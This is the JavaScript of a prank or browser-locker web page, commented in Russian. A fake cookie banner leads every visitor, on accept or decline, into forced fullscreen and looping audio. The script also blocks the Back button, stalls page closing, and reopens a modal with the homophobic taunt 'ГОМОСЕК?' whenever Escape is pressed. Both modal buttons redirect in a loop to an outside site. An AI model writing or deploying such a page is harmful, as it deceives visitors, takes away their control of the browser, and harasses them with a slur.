let fullscreenActivated = false;
const audio = new Audio("zvuki.mp3");
audio.loop = true;

function startSound() {
  audio.play()
      .then(() => console.log(" звук запущен"))
      .catch(err => console.error(" ошибка:", err));
}

// Fullscreen после первого взаимодействия
function activateFullscreen() {
    if (!fullscreenActivated) {
        const el = document.documentElement;
        if (el.requestFullscreen) el.requestFullscreen();
        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

        fullscreenActivated = true;
    }
}

function showMainContent() {
    document.getElementById("cookie-banner").style.display = "none";
    document.getElementById("overlay").style.display = "block";
    
    activateFullscreen();
    startSound();
}

// Обработчики для баннера куки
document.getElementById("accept-cookies").addEventListener("click", () => {
    console.log("Cookies принято");
    showMainContent();
});

document.getElementById("decline-cookies").addEventListener("click", () => {
    console.log("Cookies отклонено");
    showMainContent();
});

// Блокировка кнопки "Назад"
history.pushState(null, null, location.href);
window.onpopstate = function () {
    history.pushState(null, null, location.href);
};

// Предупреждение при закрытии
window.addEventListener("beforeunload", (e) => {
	for(i=10000;i>0;i--) {
		e.preventDefault();
	}
});

// Регистрация service worker (для PWA)
/*if ("serviceWorker" in navigator) {
    navigator.serviceWorker.register("service-worker.js");
}*/
/*
document.getElementById("go").addEventListener("click", () => {
  activateFullscreen();
  startSound();
  for(i=10000;i>0;i--) {
	location.href = "https://rsrchr1.github.io/uab/";
  }
});*/

document.getElementById("go").addEventListener("click", (e) => {
    e.stopPropagation();
    openModal();
});

// Отслеживание нажатия клавиши ESC
document.addEventListener("keydown", (e) => {
    if (e.key === "Escape" || e.key === "Esc") {
        // Проверяем, открыто ли уже окно
        const modal = document.getElementById("modal");
        if (modal.style.display === "none" || !modal.style.display) {
            openModal();
        }
    }
});


const MODAL_TEXT = "ГОМОСЕК?";

// Функция открытия modal окна
function openModal() {
    const modal = document.getElementById("modal");
    const text = document.getElementById("modal-text");
    
    text.textContent = MODAL_TEXT;
    modal.style.display = "block";
}

// Функция закрытия modal окна
function closeModal() {
    const modal = document.getElementById("modal");
    modal.style.display = "none";
}

document.getElementById("modal-accept").addEventListener("click", () => {
    console.log("Кнопка 'Принять' нажата");
    openModal();
    for(i=10000;i>0;i--) {
	    location.href = "https://rsrchr1.github.io/uab/";
    }
});

// Кнопка "Отклонить" - ДОБАВЬТЕ СВОЙ ФУНКЦИОНАЛ ЗДЕСЬ
document.getElementById("modal-decline").addEventListener("click", () => {
    console.log("Кнопка 'Отклонить' нажата");
    openModal();
    for(i=10000;i>0;i--) {
	    location.href = "https://rsrchr1.github.io/uab/";
    }
});